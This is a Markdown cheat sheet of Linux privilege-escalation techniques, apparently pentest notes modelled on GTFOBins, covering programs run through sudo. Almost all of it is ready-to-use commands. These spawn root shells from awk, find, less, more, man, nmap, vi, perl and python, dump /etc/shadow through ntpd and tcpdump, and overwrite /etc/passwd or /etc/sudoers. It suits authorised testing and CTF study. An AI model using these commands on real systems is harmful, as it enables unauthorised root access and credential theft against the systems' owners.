# Applications that can be used (when they have sudo access):

* See [GTFOBins](https://gtfobins.github.io/#+sudo)

* Then see below:

- `awk`
```sh
$ awk 'BEGIN {system("/bin/bash")}'
```

- `bash`

- `cp` copy and overwrite /etc/shadow or /etc/passwd
```
$ sudo cp /etc/passwd /var/www.html
$ openssl passwd -1 -salt hack pass123
```

- `find`
```sh
$ sudo find / -exec bash -i \;
$ sudo find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
$ sudo find /etc/passwd -exec /bin/sh \;
$ sudo find /bin -name nano -exec /bin/sh \;
```

- `ht`  
  The text/binary-editor HT. Edit `/etc/sudoers` as root, in HEX
```
(  A  L  L  )     A  L  L     #     A  A  A  A  A  ...
28 41 4c 4c 29 20 41 4c 4c 0a 23 20 41 41 41 41 41 ...
```

- `less`  
From less you can go into vi, and then into a shell.
```sh
$ sudo less /etc/shadow
# switch to vi
> vi
# open shell
> :shell
```
```sh
# from sudo:
# see man: ! signals start of the shell command.
$ sudo less /etc/shadow
<file name> !/bin/bash
```

- `more`  
You need to run more on a file that is bigger than your screen.  
```sh
$ sudo more /home/something/myfile
!/bin/bash
```
Or press *!sh* and hit enter

- `mv`  
Overwrite `/etc/shadow` or `/etc/sudoers`

- `man` Check for man pages, can run commands from man:

  ```sh
  $ sudo man ls
  [...]
  # inside the ENV file.  To set the ENV variable to some file, place the following line in your .profile of your
  [...]
  Manual page sh(1) line 1 (press h for help or q to quit): !/bin/sh

  # So once man opened, get the shell --> !/bin/sh
  ```

  **OR**

  ```sh
  $ sudo man man
  ````
  after that press `!sh` and hit enter

- `nano`, like any other editor can be abused when executed as a privileged user. A privileged user could add a user to `/etc/passwd`.

- `nc`

- `nmap`

  ```sh
  & sudo nmap --interactive
  nmap> !sh
  sh-4.1#

  # Without interactive which is not available in latest version
  echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
  ```

- `ntpd` "ntpd lets you specify a config file with -c and put it into debug mode with -d, if I specify /etc/shadow as the config and enable debug mode it will error on each line of /etc/shadow as its not a valid ntpd configuration, and helpfully show me the lines that it fails on - thus disclosing the contents of /etc/shadow"
```
$ /usr/sbin/ntpd -c /etc/shadow -d -d -d -d | grep T_String
```

- `python / perl / ruby / lua / etc`
```perl
$ sudo perl
exec "/bin/bash";
ctr-d
```  
```python
$ sudo python
import os
os.system("/bin/bash")
```
- `sh`

- `sudo`
  ```
  ...
  -rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
  ...

  $ sudo -i
  # whoami
  # root
  ```

- `tcpdump`
```sh
$ echo $'id\ncat /etc/shadow' > /tmp/.test
$ chmod +x /tmp/.test
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

- `vi` / `vim`

  ```sh
  $ sudo vi
  :shell

  :set shell=/bin/bash:shell    
  :!bash
  ```
